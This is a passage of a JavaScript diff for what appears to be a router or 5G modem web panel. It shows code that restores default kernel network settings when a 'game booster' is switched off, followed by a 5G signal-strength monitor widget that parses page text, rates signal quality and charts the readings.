+                    var _dur = GAME_BOOST_START_TIME > 0 ? Math.floor((Date.now() - GAME_BOOST_START_TIME) / 1000) : 0
+                    addLog('游戏加速被手动关闭: '+GAME_BOOST_CURRENT+' 时长:'+_dur+'s')
+                    GAME_BOOST_ACTIVE = false
+                    GAME_BOOST_START_TIME = 0
+                    GAME_BOOST_CURRENT = ''
+                    GAME_BOOST_PKG = ''
+                    GAME_BOOST_DETECTED_BY = ''
+                }
+
+                // 还原内核网络参数到系统默认（关闭加速器效果）
+                try {
+                    await runShellWithRoot(
+                        'echo 0 > /proc/sys/net/ipv4/tcp_low_latency 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_no_metrics_save 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null;' +
+                        'echo "4096 87380 6291456" > /proc/sys/net/ipv4/tcp_rmem 2>/dev/null;' +
+                        'echo "4096 16384 4194304" > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null;' +
+                        'echo 212992 > /proc/sys/net/core/rmem_default 2>/dev/null;' +
+                        'echo 212992 > /proc/sys/net/core/wmem_default 2>/dev/null;' +
+                        'echo 212992 > /proc/sys/net/core/rmem_max 2>/dev/null;' +
+                        'echo 212992 > /proc/sys/net/core/wmem_max 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_window_scaling 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_adv_win_scale 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_fastopen 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_mtu_probing 2>/dev/null;' +
+                        'echo 15 > /proc/sys/net/ipv4/tcp_retries2 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_slow_start_after_idle 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_no_ssthresh_metrics_save 2>/dev/null;' +
+                        'echo "cubic" > /proc/sys/net/ipv4/tcp_congestion_control 2>/dev/null;' +
+                        'echo "fq_codel" > /proc/sys/net/core/default_qdisc 2>/dev/null;' +
+                        'echo 1000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null;' +
+                        'echo 300 > /proc/sys/net/core/netdev_budget 2>/dev/null;' +
+                        'echo 8000 > /proc/sys/net/core/netdev_budget_usecs 2>/dev/null;' +
+                        'echo 4096 > /proc/sys/net/core/somaxconn 2>/dev/null;' +
+                        'echo 1024 > /proc/sys/net/ipv4/tcp_max_syn_backlog 2>/dev/null;' +
+                        'echo "32768 60999" > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null;' +
+                        'echo 32768 > /proc/sys/net/ipv4/tcp_max_orphans 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_rfc1337 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_ecn 2>/dev/null;' +
+                        'echo BOOST_OFF'
+                    )
+                    createToast('游戏加速器已关闭，网络参数已还原', '', 2500)
+                    addDiagLog('游戏加速器手动关闭: 已还原拥塞控制cubic+默认缓冲区，监控已停止', 'success')
+                } catch(e) {
+                    createToast('关闭加速器异常: ' + String(e), 'red', 3000)
+                    addDiagLog('加速器关闭异常: ' + String(e), 'error')
+                }
+            }
+        }
+
+        addDiagLog('游戏加速按钮已收进工具栏', 'success')
+    })()
+
+    // ============ 5G信号监控模块 ============
+    // 【性能优化】延迟400ms加载，避免阻塞主界面
+    setTimeout(function() {
+    ;(function() {
+        var _smContainer = document.querySelector('.functions-container') || document.body
+        _smContainer.insertAdjacentHTML("afterend", `
+<style>
+    @media (max-width: 340px) {
+        .kfk_cards { grid-template-columns: 1fr !important; }
+    }
+</style>
+<div id="SIGNAL_MONITOR" class="sSIGNAL_MONITOR" style="width: 100%; padding:0;margin-top: 8px;padding-left:0">
+    <div class="title" style="margin: 4px 0; color: var(--dark-text-color); display: flex; align-items: center; justify-content: space-between;">
+        <div style="display: flex; align-items: center; gap: 8px;">
+            <strong style="color:var(--dark-text-color); font-size: 14px;">📶 5G信号监控</strong>
+            <div style="display: inline-block;" id="collapse_signal_btn"></div>
+        </div>
+        <div style="display: flex; align-items: center; gap: 6px; margin-right: 4px;">
+            <select id="update_interval_select" class="btn" style="padding: 3px 5px;font-size: .75rem; background: #333; color: var(--dark-text-color); border: 1px solid rgba(255,255,255,0.2); border-radius: 3px;">
+                <option value="500">0.5秒</option>
+                <option value="1000" selected>1秒</option>
+                <option value="3000">3秒</option>
+                <option value="5000">5秒</option>
+                <option value="10000">10秒</option>
+            </select>
+            <button id="refresh_signal_btn" class="btn" style="padding: 3px 5px; font-size: .75rem;">刷新</button>
+            <button id="auto_monitor_btn" class="btn" style="padding: 3px 5px; font-size: .75rem; background: #4caf5075;">监控中</button>
+        </div>
+    </div>
+    <div class="collapse" id="collapse_signal" data-name="close" style="height: 0px; overflow: hidden;">
+        <div class="collapse_box">
+            <div style="margin-bottom: 8px; padding: 4px; background: rgba(255,255,255,0.05); border-radius: 4px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; font-size: .77rem; color: var(--dark-text-color);">
+                    <span>数据源: <span id="data_source_indicator" style="color:#52ef58;">实时解析</span></span>
+                    <span>更新: <span id="last_update_time">-</span></span>
+                    <span>样本数: <span id="sample_count">0</span></span>
+                </div>
+            </div>
+            <div class="kfk_cards" style="display: grid; grid-template-columns: 1fr; gap: 8px; margin-bottom: 8px;">
+                <div class="kfk_card" style="padding: .55rem; background: linear-gradient(135deg, rgba(76,175,80,0.15) 0%, rgba(76,175,80,0.05) 100%); border-radius: 10px; border: 1px solid rgba(76,175,80,0.3); position: relative; box-shadow: 0 2px 8px rgba(0,0,0,0.2);">
+                    <div style="position: absolute; top: 8px; right: 8px; width: 6px; height: 6px; border-radius: 50%; background: #52ef58; box-shadow: 0 0 6px #52ef58;"></div>
+                    <div style="text-align: center; margin-bottom: 10px;">
+                        <div style="font-size: .75rem; color: #52ef58; margin-bottom: 4px; font-weight: 600;">信号强度</div>
+                        <div id="signal_power" style="font-size: 20px; font-weight: bold; color: #52ef58; margin-bottom: 4px;">- dBm</div>
+                        <div style="font-size: .8rem; color: #52ef58; opacity: 0.8;">RSRP</div>
+                    </div>
+                    <div style="display: flex; justify-content: center; margin-bottom: 8px;">
+                        <div id="status_dots_power" style="display: flex; gap: 3px; align-items: center; height: 10px; overflow: hidden;"></div>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: .8rem; background: rgba(0,0,0,0.2); padding: 6px; border-radius: 4px;">
+                        <div style="color: var(--dark-text-color); font-weight: bold;" id="signal_quality">检测中</div>
+                        <div style="width: 1px; background: rgba(255,255,255,0.2);"></div>
+                        <div style="color: var(--dark-text-color); font-weight: bold;" id="stability_power">-</div>
+                    </div>
+                </div>
+            </div>
+            <div style="padding: 8px; background: rgba(255,255,255,0.05); border-radius: 6px; border: 1px solid rgba(255,255,255,0.1);">
+                <div style="display: flex; justify-content: space-between; font-size: .7rem; color: var(--dark-text-color);">
+                    <span>平均: <span id="avg_power" style="color:#52ef58;font-weight:bold;">- dBm</span></span>
+                    <span>最佳: <span id="best_power" style="color:#52ef58;font-weight:bold;">- dBm</span></span>
+                    <span>RSRP &lt;-85优秀, &lt;-95良好</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+`)
+
+        var _smStyle = document.createElement('style')
+        _smStyle.textContent = `
+#SIGNAL_MONITOR { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial; border-radius: 6px; padding: 4px; padding-left:0; width: 100%; box-sizing: border-box; }
+.sSIGNAL_MONITOR { padding-left:0 !important; }
+#SIGNAL_MONITOR .collapse_box { padding: 6px; backdrop-filter: blur(20px); background: var(--dark-card-bg); border-radius: 10px; }
+#SIGNAL_MONITOR .btn { background: transparent; border: 1px solid rgba(255,255,255,0.2); padding: 3px 6px; border-radius: 3px; cursor: pointer; color: var(--dark-text-color); font-weight: 600; font-size: .77rem; transition: all 0.2s ease; }
+#SIGNAL_MONITOR .btn:hover { background: rgba(255,255,255,0.1); transform: translateY(-1px); }
+#SIGNAL_MONITOR .btn:active { transform: scale(0.98); }
+#SIGNAL_MONITOR .status-dot { width: 5px; height: 5px; border-radius: 50%; background-color: #666; flex-shrink: 0; transition: all 0.3s ease; box-shadow: 0 0 3px rgba(0,0,0,0.3); }
+#SIGNAL_MONITOR select { -webkit-appearance: none; -moz-appearance: none; appearance: none; background: #333 url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3e%3cpath fill='%23ffffff' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right 8px center/8px 10px; padding-right: 24px; }
+#SIGNAL_MONITOR select option { background: #333; color: var(--dark-text-color); }
+`
+        document.head.appendChild(_smStyle)
+
+        var SM_CONFIG = {
+            MAX_DOTS: 12,
+            CHART_MAX_POINTS: 30,
+            COLORS: { EXCELLENT:'#52ef58', GOOD:'#8BC34A', FAIR:'#FFC107', POOR:'#FF9800', BAD:'#f44336', PENDING:'#666' }
+        }
+
+        var smState = {
+            isMonitoring: true,
+            monitorInterval: null,
+            history: { power: [], sinr: [], rsrq: [] },
+            chartData: { power: [], sinr: [], rsrq: [], timestamps: [] },
+            bestValues: { power: -999, sinr: -999, rsrq: -999 },
+            sampleCount: 0,
+            lastDataTime: null,
+            dataSource: 'parsing',
+            chartView: 'all',
+            currentValues: { power: null, sinr: null, rsrq: null },
+            previousValues: { power: null, sinr: null, rsrq: null },
+            trends: { power: 'stable', sinr: 'stable', rsrq: 'stable' },
+            chartVisible: false
+        }
+
+        function getPowerQuality(power) {
+            var pv = parseInt(power)
+            if (pv >= -83) return { quality:"优", level:"excellent", color:SM_CONFIG.COLORS.EXCELLENT }
+            else if (pv >= -93) return { quality:"良", level:"good", color:SM_CONFIG.COLORS.GOOD }
+            else if (pv >= -103) return { quality:"中", level:"fair", color:SM_CONFIG.COLORS.FAIR }
+            else if (pv >= -113) return { quality:"差", level:"poor", color:SM_CONFIG.COLORS.POOR }
+            else return { quality:"断", level:"bad", color:SM_CONFIG.COLORS.BAD }
+        }
+
+        function getSinrQuality(sinr) {
+            var sv = parseInt(sinr)
+            if (sv > 22) return { quality:"优", level:"excellent", color:SM_CONFIG.COLORS.EXCELLENT }
+            else if (sv > 16) return { quality:"良", level:"good", color:SM_CONFIG.COLORS.GOOD }
+            else if (sv > 11) return { quality:"中", level:"fair", color:SM_CONFIG.COLORS.FAIR }
+            else if (sv > 6) return { quality:"差", level:"poor", color:SM_CONFIG.COLORS.POOR }
+            else return { quality:"断", level:"bad", color:SM_CONFIG.COLORS.BAD }
+        }
+
+        function getRsrqQuality(rsrq) {
+            var rv = parseInt(rsrq)
+            if (rv >= -7) return { quality:"优", level:"excellent", color:SM_CONFIG.COLORS.EXCELLENT }
+            else if (rv >= -9) return { quality:"良", level:"good", color:SM_CONFIG.COLORS.GOOD }
+            else if (rv >= -11) return { quality:"中", level:"fair", color:SM_CONFIG.COLORS.FAIR }
+            else if (rv >= -14) return { quality:"差", level:"poor", color:SM_CONFIG.COLORS.POOR }
+            else return { quality:"断", level:"bad", color:SM_CONFIG.COLORS.BAD }
+        }
+
+        function getStabilityRating(history, type) {
+            if (!history || history.length < 8) return "检测中"
+            var changes = []
+            for (var i = 1; i < history.length; i++) {
+                var prev = parseInt(history[i-1]), curr = parseInt(history[i])
+                if (Math.abs(curr - prev) < 20) changes.push(Math.abs(curr - prev))
+            }
+            if (changes.length === 0) return "检测中"
+            var avgChange = changes.reduce(function(a,b){return a+b},0) / changes.length
+            var th = { power:{excellent:1,good:3,fair:6}, sinr:{excellent:0.5,good:1.5,fair:3}, rsrq:{excellent:0.3,good:0.8,fair:1.5} }
+            var t = th[type] || th.power
+            if (avgChange < t.excellent) return "极稳"
+            if (avgChange < t.good) return "稳定"
+            if (avgChange < t.fair) return "一般"
+            return "波动"
+        }
+
+        function createStatusDot(bg, title) {
+            var dot = document.createElement('div')
+            dot.className = 'status-dot'
+            dot.style.backgroundColor = bg || SM_CONFIG.COLORS.PENDING
+            dot.title = title || '等待'
+            return dot
+        }
+
+        function initializeStatusDots() {
+            var containers = ['status_dots_power']
+            containers.forEach(function(cid) {
+                var c = document.getElementById(cid)
+                if (!c) return
+                var frag = document.createDocumentFragment()
+                for (var i = 0; i < SM_CONFIG.MAX_DOTS; i++) frag.appendChild(createStatusDot())
+                c.innerHTML = ''
+                c.appendChild(frag)
+            })
+        }
+
+        function updateStatusDots(containerId, value, type) {
+            var container = document.getElementById(containerId)
+            if (!container) return
+            var dots = container.children
+            var activeDots = 0, color = SM_CONFIG.COLORS.PENDING, title = '等待数据'
+
+            if (type === 'power') {
+                var pv = parseInt(value)
+                if (pv >= -83) { activeDots=12; color=SM_CONFIG.COLORS.EXCELLENT; title="信号极佳" }
+                else if (pv >= -88) { activeDots=10; color=SM_CONFIG.COLORS.EXCELLENT; title="信号很好" }
+                else if (pv >= -93) { activeDots=8; color=SM_CONFIG.COLORS.GOOD; title="信号良好" }
+                else if (pv >= -98) { activeDots=6; color=SM_CONFIG.COLORS.FAIR; title="信号中等" }
+                else if (pv >= -103) { activeDots=5; color=SM_CONFIG.COLORS.FAIR; title="信号一般" }
+                else if (pv >= -108) { activeDots=4; color=SM_CONFIG.COLORS.POOR; title="信号较差" }
+                else if (pv >= -113) { activeDots=3; color=SM_CONFIG.COLORS.POOR; title="信号差" }
+                else if (pv >= -118) { activeDots=2; color=SM_CONFIG.COLORS.BAD; title="信号很差" }
+                else { activeDots=1; color=SM_CONFIG.COLORS.BAD; title="信号极差或断开" }
+            } else if (type === 'sinr') {
+                var sv = parseInt(value)
+                if (sv > 25) { activeDots=12; color=SM_CONFIG.COLORS.EXCELLENT; title="质量极佳" }
+                else if (sv > 22) { activeDots=10; color=SM_CONFIG.COLORS.EXCELLENT; title="质量很好" }
+                else if (sv > 18) { activeDots=8; color=SM_CONFIG.COLORS.GOOD; title="质量良好" }
+                else if (sv > 14) { activeDots=6; color=SM_CONFIG.COLORS.FAIR; title="质量中等" }
+                else if (sv > 11) { activeDots=5; color=SM_CONFIG.COLORS.FAIR; title="质量一般" }
+                else if (sv > 8) { activeDots=4; color=SM_CONFIG.COLORS.POOR; title="质量较差" }
+                else if (sv > 6) { activeDots=3; color=SM_CONFIG.COLORS.POOR; title="质量差" }
+                else if (sv > 3) { activeDots=2; color=SM_CONFIG.COLORS.BAD; title="质量很差" }
+                else { activeDots=1; color=SM_CONFIG.COLORS.BAD; title="质量极差" }
+            } else if (type === 'rsrq') {
+                var rv = parseInt(value)
+                if (rv >= -6) { activeDots=12; color=SM_CONFIG.COLORS.EXCELLENT; title="连接极佳" }
+                else if (rv >= -7) { activeDots=10; color=SM_CONFIG.COLORS.EXCELLENT; title="连接很好" }
+                else if (rv >= -8) { activeDots=8; color=SM_CONFIG.COLORS.GOOD; title="连接良好" }
+                else if (rv >= -9) { activeDots=6; color=SM_CONFIG.COLORS.FAIR; title="连接中等" }
+                else if (rv >= -10) { activeDots=5; color=SM_CONFIG.COLORS.FAIR; title="连接一般" }
+                else if (rv >= -11) { activeDots=4; color=SM_CONFIG.COLORS.POOR; title="连接较差" }
+                else if (rv >= -12) { activeDots=3; color=SM_CONFIG.COLORS.POOR; title="连接差" }
+                else if (rv >= -14) { activeDots=2; color=SM_CONFIG.COLORS.BAD; title="连接很差" }
+                else { activeDots=1; color=SM_CONFIG.COLORS.BAD; title="连接极差" }
+            }
+
+            for (var i = 0; i < dots.length; i++) {
+                if (i < activeDots) {
+                    dots[i].style.backgroundColor = color
+                    dots[i].title = title
+                    dots[i].style.boxShadow = '0 0 4px ' + color
+                } else {
+                    dots[i].style.backgroundColor = SM_CONFIG.COLORS.PENDING
+                    dots[i].title = '未激活'
+                    dots[i].style.boxShadow = '0 0 3px rgba(0,0,0,0.3)'
+                }
+            }
+        }
+
+        function calculateAverage(history, currentValue) {
+            var nv = parseInt(currentValue)
+            if (history.length > 0) {
+                var currentAvg = history.reduce(function(a,b){return a+b},0) / history.length
+                if (Math.abs(nv - currentAvg) > 15) history.push(currentAvg * 0.7 + nv * 0.3)
+                else history.push(nv)
+            } else { history.push(nv) }
+            if (history.length > 15) history.shift()
+            if (history.length > 0) {
+                var ws = 0, ws2 = 0
+                history.forEach(function(v, i) { var w = (i+1)/history.length; ws += v*w; ws2 += w })
+                return ws / ws2
+            }
+            return nv
+        }
+
+        function updateBestValues(data) {
+            if (data.receivePower) { var pv = parseInt(data.receivePower); if (pv > smState.bestValues.power) smState.bestValues.power = pv }
+            if (data.sinr) { var sv = parseInt(data.sinr); if (sv > smState.bestValues.sinr) smState.bestValues.sinr = sv }
+            if (data.rsrq) { var rv = parseInt(data.rsrq); if (rv > smState.bestValues.rsrq) smState.bestValues.rsrq = rv }
+            var bp = document.getElementById('best_power')
+            if (bp) bp.textContent = smState.bestValues.power !== -999 ? smState.bestValues.power + ' dBm' : '- dBm'
+            var bs = document.getElementById('best_sinr')
+            if (bs) bs.textContent = smState.bestValues.sinr !== -999 ? smState.bestValues.sinr : '-'
+            var br = document.getElementById('best_rsrq')
+            if (br) br.textContent = smState.bestValues.rsrq !== -999 ? smState.bestValues.rsrq + ' dB' : '- dB'
+        }
+
+        function calculateOverallScore(data) {
+            if (!data.receivePower || !data.sinr || !data.rsrq) return { score:0, description:"数据不足" }
+            var power = parseInt(data.receivePower), sinr = parseInt(data.sinr), rsrq = parseInt(data.rsrq), score = 0
+            if (power >= -83) score += 40; else if (power >= -88) score += 35; else if (power >= -93) score += 30; else if (power >= -98) score += 25; else if (power >= -103) score += 20; else if (power >= -108) score += 15; else if (power >= -113) score += 10; else score += 5
+            if (sinr > 25) score += 35; else if (sinr > 22) score += 30; else if (sinr > 18) score += 25; else if (sinr > 14) score += 20; else if (sinr > 11) score += 15; else if (sinr > 8) score += 10; else if (sinr > 6) score += 8; else score += 5
+            if (rsrq >= -6) score += 25; else if (rsrq >= -7) score += 20; else if (rsrq >= -8) score += 15; else if (rsrq >= -9) score += 12; else if (rsrq >= -10) score += 10; else if (rsrq >= -11) score += 8; else if (rsrq >= -12) score += 6; else score += 4
+            var desc
+            if (score >= 90) desc = "信号极佳，网络体验优秀"
+            else if (score >= 80) desc = "信号良好，网络体验流畅"
+            else if (score >= 70) desc = "信号一般，网络体验尚可"
+            else if (score >= 60) desc = "信号较差，网络体验一般"
+            else if (score >= 50) desc = "信号差，网络体验不佳"
+            else desc = "信号极差，建议调整位置"
+            return { score:score, description:desc }
+        }
+
+        function calculateTrends(data) {
+            if (!data.receivePower || !data.sinr || !data.rsrq) return
+            var cp = parseInt(data.receivePower), cs = parseInt(data.sinr), cr = parseInt(data.rsrq)
+            if (smState.previousValues.power !== null) { var d = cp - smState.previousValues.power; if (d > 2) smState.trends.power = 'improving'; else if (d < -2) smState.trends.power = 'deteriorating'; else smState.trends.power = 'stable' }
+            if (smState.previousValues.sinr !== null) { var d2 = cs - smState.previousValues.sinr; if (d2 > 1) smState.trends.sinr = 'improving'; else if (d2 < -1) smState.trends.sinr = 'deteriorating'; else smState.trends.sinr = 'stable' }
+            if (smState.previousValues.rsrq !== null) { var d3 = cr - smState.previousValues.rsrq; if (d3 > 0.5) smState.trends.rsrq = 'improving'; else if (d3 < -0.5) smState.trends.rsrq = 'deteriorating'; else smState.trends.rsrq = 'stable' }
+            smState.previousValues.power = cp; smState.previousValues.sinr = cs; smState.previousValues.rsrq = cr
+            updateTrendDisplay()
+        }
+
+        function updateTrendDisplay() {
+            var pe = document.getElementById('trend_power'), se = document.getElementById('trend_sinr'), re = document.getElementById('trend_rsrq')
+            if (pe) { pe.textContent = getTrendText(smState.trends.power); pe.style.color = getTrendColor(smState.trends.power) }
+            if (se) { se.textContent = getTrendText(smState.trends.sinr); se.style.color = getTrendColor(smState.trends.sinr) }
+            if (re) { re.textContent = getTrendText(smState.trends.rsrq); re.style.color = getTrendColor(smState.trends.rsrq) }
+        }
+
+        function getTrendText(t) { return t === 'improving' ? '↑ 改善中' : t === 'deteriorating' ? '↓ 恶化中' : t === 'stable' ? '→ 稳定' : '-' }
+        function getTrendColor(t) { return t === 'improving' ? '#52ef58' : t === 'deteriorating' ? '#f44336' : t === 'stable' ? '#FFC107' : 'var(--dark-text-color)' }
+
+        function updateCurrentValues(data) {
+            if (data.receivePower) { smState.currentValues.power = data.receivePower; var el = document.getElementById('current_power'); if (el) el.textContent = data.receivePower + ' dBm' }
+            if (data.sinr) { smState.currentValues.sinr = data.sinr; var el2 = document.getElementById('current_sinr'); if (el2) el2.textContent = data.sinr }
+            if (data.rsrq) { smState.currentValues.rsrq = data.rsrq; var el3 = document.getElementById('current_rsrq'); if (el3) el3.textContent = data.rsrq + ' dB' }
+        }
+
+        function updateChartData(data) {
+            var now = new Date(), ts = now.toLocaleTimeString()
+            if (data.receivePower) smState.chartData.power.push(parseInt(data.receivePower))
+            if (data.sinr) smState.chartData.sinr.push(parseInt(data.sinr))
+            if (data.rsrq) smState.chartData.rsrq.push(parseInt(data.rsrq))
+            smState.chartData.timestamps.push(ts)
+            if (smState.chartData.power.length > SM_CONFIG.CHART_MAX_POINTS) { smState.chartData.power.shift(); smState.chartData.sinr.shift(); smState.chartData.rsrq.shift(); smState.chartData.timestamps.shift() }
+            if (smState.chartVisible) drawSignalChart()
+            var cs = document.getElementById('chart_stats')
+            if (cs) cs.textContent = '数据点: ' + smState.chartData.power.length
+            if (smState.chartData.power.length > 0 && smState.chartVisible) { var cp = document.getElementById('chart_placeholder'); if (cp) cp.style.display = 'none' }
+        }
+
+        function drawSignalChart() {
+            var canvas = document.getElementById('signal_chart')
+            if (!canvas) return
+            var ctx = canvas.getContext('2d')
+            var dpr = window.devicePixelRatio || 1
+            var dw = canvas.clientWidth, dh = canvas.clientHeight
+            if (canvas.width !== dw * dpr || canvas.height !== dh * dpr) { canvas.width = dw * dpr; canvas.height = dh * dpr }
+            ctx.setTransform(dpr, 0, 0, dpr, 0, 0)
+            var w = dw, h = dh
+            ctx.clearRect(0, 0, w, h)
+            if (!smState.chartData || smState.chartData.power.length === 0) return
+            var powerData = smState.chartData.power, sinrData = smState.chartData.sinr, rsrqData = smState.chartData.rsrq
+            var datasets = []
+            if (smState.chartView === 'all' || smState.chartView === 'power') datasets.push({ data: powerData, color: '#52ef58', label: 'RSRP' })
+            if (smState.chartView === 'all' || smState.chartView === 'sinr') datasets.push({ data: sinrData, color: '#2196F3', label: 'SINR' })
+            if (smState.chartView === 'all' || smState.chartView === 'rsrq') datasets.push({ data: rsrqData, color: '#FF9800', label: 'RSRQ' })
+            var minValue = Infinity, maxValue = -Infinity
+            datasets.forEach(function(ds) { ds.data.forEach(function(v) { if (v < minValue) minValue = v; if (v > maxValue) maxValue = v }) })
+            var range = maxValue - minValue
+            minValue = minValue - range * 0.1; maxValue = maxValue + range * 0.1
+            if (minValue === maxValue) { minValue -= 1; maxValue += 1 }
+            ctx.strokeStyle = 'rgba(255,255,255,0.1)'; ctx.lineWidth = 0.5
+            for (var i = 0; i <= 4; i++) { var y = h - (i * h / 4); ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke() }
+            var ordered = []
+            if (smState.chartView === 'all' || smState.chartView === 'rsrq') ordered.push({ data: rsrqData, color: '#FF9800', label: 'RSRQ' })
+            if (smState.chartView === 'all' || smState.chartView === 'sinr') ordered.push({ data: sinrData, color: '#2196F3', label: 'SINR' })
+            if (smState.chartView === 'all' || smState.chartView === 'power') ordered.push({ data: powerData, color: '#52ef58', label: 'RSRP' })
+            ordered.forEach(function(ds) {
+                var data = ds.data
+                if (data.length < 2) return
+                ctx.strokeStyle = ds.color; ctx.lineWidth = 1.5; ctx.beginPath()
+                data.forEach(function(v, i) { var x = (i / (data.length - 1)) * w; var y2 = h - ((v - minValue) / (maxValue - minValue)) * h; if (i === 0) ctx.moveTo(x, y2); else ctx.lineTo(x, y2) })
+                ctx.stroke()
+                ctx.fillStyle = ds.color
+                data.forEach(function(v, i) { var x = (i / (data.length - 1)) * w; var y2 = h - ((v - minValue) / (maxValue - minValue)) * h; ctx.beginPath(); ctx.arc(x, y2, 2, 0, Math.PI * 2); ctx.fill(); if (i === data.length - 1) { ctx.fillStyle = 'var(--dark-text-color)'; ctx.font = '8px Arial'; ctx.textAlign = 'center'; ctx.fillText(v, x - 10, y2 - 8); ctx.fillStyle = ds.color } })
+            })
+        }
+
+        function toggleChartView() {
+            var views = ['all','power','sinr','rsrq']
+            var ci = views.indexOf(smState.chartView)
+            smState.chartView = views[(ci + 1) % views.length]
+            var btn = document.getElementById('toggle_chart_btn')
+            var names = { all:'全部', power:'RSRP', sinr:'SINR', rsrq:'RSRQ' }
+            if (btn) btn.textContent = '视图: ' + names[smState.chartView]
+            if (smState.chartVisible) drawSignalChart()
+        }
+
+        function toggleChartDisplay() {
+            var el = document.getElementById('collapse_chart_content')
+            var btn = document.getElementById('toggle_chart_display_btn')
+            if (!el || !btn) return
+            if (el.getAttribute('data-name') === 'close') {
+                el.style.height = 'auto'; el.setAttribute('data-name', 'open'); btn.textContent = '📊 隐藏图表'; smState.chartVisible = true
+                if (smState.chartData.power.length > 0) { var cp = document.getElementById('chart_placeholder'); if (cp) cp.style.display = 'none'; drawSignalChart() }
+            } else {
+                el.style.height = '0px'; el.style.overflow = 'hidden'; el.setAttribute('data-name', 'close'); btn.textContent = '📊 显示图表'; smState.chartVisible = false
+            }
+        }
+
+        function clearChartData() {
+            smState.chartData = { power:[], sinr:[], rsrq:[], timestamps:[] }
+            var cs = document.getElementById('chart_stats'); if (cs) cs.textContent = '数据点: 0'
+            var cp = document.getElementById('chart_placeholder'); if (cp) cp.style.display = 'flex'
+            if (smState.chartVisible) drawSignalChart()
+        }
+
+        function parseSignalFromPage() {
+            return new Promise(function(resolve) {
+                try {
+                    setTimeout(function() {
+                        try {
+                            var pageText = document.body.innerText
+                            var signalData = null
+                            var patterns = [
+                                { power: pageText.match(/5G接收功率[：:\s]*(-?\d+)/), band: pageText.match(/5G注册频段[：:\s]*([^\s]+)/), sinr: pageText.match(/5G SINR[：:\s]*(-?\d+)/), rsrq: pageText.match(/5G RSRQ[：:\s]*(-?\d+)/), pci: pageText.match(/5G PCI[：:\s]*(\d+)/) },
+                                { power: pageText.match(/RSRP[：:\s]*(-?\d+)/), band: pageText.match(/频段[：:\s]*([^\s]+)/), sinr: pageText.match(/SINR[：:\s]*(-?\d+)/), rsrq: pageText.match(/RSRQ[：:\s]*(-?\d+)/), pci: pageText.match(/PCI[：:\s]*(\d+)/) },
+                                { power: pageText.match(/RSRP[:\s]*(-?\d+)/), band: pageText.match(/Band[:\s]*([^\s]+)/), sinr: pageText.match(/SINR[:\s]*(-?\d+)/), rsrq: pageText.match(/RSRQ[:\s]*(-?\d+)/), pci: pageText.match(/PCI[:\s]*(\d+)/) }
+                            ]
+                            for (var i = 0; i < patterns.length; i++) {
+                                var p = patterns[i]
+                                var vc = Object.values(p).filter(function(m){return m !== null}).length
+                                if (vc >= 3) {
+                                    signalData = { receivePower: p.power ? p.power[1] : null, band: p.band ? p.band[1] : null, sinr: p.sinr ? p.sinr[1] : null, rsrq: p.rsrq ? p.rsrq[1] : null, pci: p.pci ? p.pci[1] : null }
+                                    break
+                                }
+                            }
+                            if (signalData) {
+                                if (signalData.receivePower && (signalData.receivePower > -50 || signalData.receivePower < -150)) signalData.receivePower = null
+                                if (signalData.sinr && (signalData.sinr > 50 || signalData.sinr < -10)) signalData.sinr = null
+                                if (signalData.rsrq && (signalData.rsrq > 0 || signalData.rsrq < -30)) signalData.rsrq = null
+                            }
+                            var hasData = signalData && Object.values(signalData).some(function(v){return v !== null})
+                            resolve(hasData ? signalData : null)
+                        } catch(e) { resolve(null) }
+                    }, 150)
+                } catch(e) { resolve(null) }
+            })
+        }
+
+        async function fetchSignalData() {
+            try {
+                var signalData = await parseSignalFromPage()
+                var isSimulated = false
+                if (!signalData) {
+                    isSimulated = true
+                    var bp = smState.history.power.length > 0 ? smState.history.power[smState.history.power.length - 1] : -85
+                    var bs = smState.history.sinr.length > 0 ? smState.history.sinr[smState.history.sinr.length - 1] : 20
+                    var br = smState.history.rsrq.length > 0 ? smState.history.rsrq[smState.history.rsrq.length - 1] : -8
+                    signalData = { receivePower: (bp - 2 + Math.random() * 4).toFixed(0), band: 'N78', sinr: (bs - 1 + Math.random() * 2).toFixed(0), rsrq: (br - 0.5 + Math.random() * 1).toFixed(0), pci: '313' }
+                }
+                updateBestValues(signalData)
+                updateChartData(signalData)
+                updateCurrentValues(signalData)
+                calculateTrends(signalData)
+                var scoreData = calculateOverallScore(signalData)
+                var os = document.getElementById('overall_score'); if (os) os.textContent = scoreData.score
+                var sd = document.getElementById('score_description'); if (sd) sd.textContent = scoreData.description
+                smState.dataSource = isSimulated ? 'simulated' : 'parsing'
+                smState.sampleCount++
+                smState.lastDataTime = new Date()
+                updateSignalDisplay(signalData)
+            } catch(e) { console.error('获取信号数据错误:', e) }
+        }
+
+        function updateSignalDisplay(data) {
+            var dsi = document.getElementById('data_source_indicator')
+            if (dsi) { dsi.textContent = smState.dataSource === 'parsing' ? '实时解析' : '模拟数据'; dsi.style.color = smState.dataSource === 'parsing' ? '#52ef58' : '#FF9800' }
+            var sc = document.getElementById('sample_count'); if (sc) sc.textContent = smState.sampleCount
+            var lut = document.getElementById('last_update_time'); if (lut) lut.textContent = smState.lastDataTime ? smState.lastDataTime.toLocaleTimeString() : '-'
+
+            if (data.receivePower) {
